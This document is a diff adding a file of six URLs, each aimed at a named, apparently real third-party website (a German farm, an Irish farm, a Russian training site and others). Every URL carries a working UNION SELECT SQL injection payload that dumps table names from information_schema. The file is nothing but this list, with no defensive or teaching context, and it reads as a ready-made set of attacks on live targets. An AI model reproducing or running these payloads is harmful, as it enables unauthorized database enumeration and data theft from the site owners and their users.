@@ -1,0 +1,11 @@
+http://hof-ottmann.de/index-details.php?id=-4%20UNION%20SELECT%201,group_concat%28table_name%29,3,4,5,6,7%20from%20information_schema.tables%20where%20table_schema=database%28%29
+
+http://www.redmountainopenfarm.ie/news-details.php?id=-95%20UNION%20SELECT%201,group_concat%28Table_name%29,3,4,5%20from%20information_schema.tables%20where%20table_schema=database%28%29
+
+http://www.vivactiv.ru/trainings/trainers.php?id=3+union+select+group_concat%28table_name%29,2,3+from+information_schema.tables+where+table_schema=database%28%29--
+
+http://www.sumit.com.tw/theme.php?id=-2+union+select+1,2,3,4,group_concat%28table_name%29,6,7+from+information_schema.tables--
+
+http://www.indiahdtv.com/video.php?id=-28572%20UNION%20SELECT%201,group_concat%28table_name%29,3,4,5,6,7,8,9%20from%20information_schema.tables%20where%20table_schema=database%28%29--
+
+http://www.sonicmayhem.com/news.php?id=-12%27+union+select+1,2,3,4,5,group_concat%28table_name%29,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23+from+information_schema.tables+where+table_schema=database%28%29--+
